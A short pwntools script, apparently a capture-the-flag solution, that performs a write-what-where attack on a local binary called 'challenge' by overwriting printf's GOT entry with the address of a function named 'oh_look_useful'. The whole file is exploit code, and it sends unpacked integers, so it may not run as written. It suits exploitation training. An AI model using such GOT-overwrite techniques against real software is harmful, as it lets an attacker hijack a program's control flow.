from pwn import *

elf = ELF('./challenge')
p = process('./challenge')

where = (elf.got['printf'])
what = (elf.symbols['oh_look_useful'])

p.sendline(where)
p.sendline(what)
